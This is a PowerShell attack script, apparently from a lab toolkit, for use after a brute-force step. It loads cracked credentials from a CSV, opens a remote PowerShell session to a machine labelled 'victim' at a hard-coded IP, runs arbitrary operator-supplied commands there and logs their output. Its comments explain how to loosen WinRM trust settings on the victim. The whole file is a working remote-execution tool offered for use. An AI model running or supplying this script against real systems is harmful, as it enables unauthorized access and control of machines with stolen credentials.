# Run bruteforceWindowsOS.ps1 first to get the password, then run this script to run arbitrary Powershell commands
# You can change the variables below as required
# This is the same as baseScript.ps1, but it runs the command as an elevated user

# To run this script, you need to run the following commands first:
# On victim:
# Enable-PSRemoting -Force
# Set-Item wsman:\localhost\client\trustedhosts *
# Restart-Service WinRM
# On attacker:
# Start-Service WinRM
# Set-Item wsman:\localhost\client\trustedhosts *
# Restart-Service WinRM

# Take in any number of command line parameters, sseparated by commas
# Example: .\baseScriptElevated.ps1 "Get-Service, Get-Process"

# Accept a single parameter as a string
param (
    [Parameter(Position = 0, Mandatory = $true)]
    [String]
    $Parameters
)

# Split the string into individual parameters using ; as a delimiter
$Params = $Parameters -split ';'

# Import a CSV file with credentials
$credential = Import-Csv -Path "Powershell\credentials.csv" | Select-Object -First 1

# Define IP address
$ip = "172.16.2.77"

# Define filename + filepath to save to
$out = "Powershell\output.txt"

# Oneliner to read username, password from file, then start a new PSSession
$remoteSession = New-PSSession -ComputerName $ip -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList $credential.Username, (ConvertTo-SecureString $credential.Password -AsPlainText -Force))
Write-Host "Connected"

# Print the parameters
$Params | ForEach-Object {
    # Convert inner command to scriptblock format
    $sb = [scriptblock]::Create($_)

    # Invoke the command on the remote machine
    Write-Host "Running $_"
    Invoke-Command -Session $remoteSession -ScriptBlock $sb | Out-File -FilePath $out -Append
}

# Closes the PSSession
Exit-PSSession
Write-Host "Done"
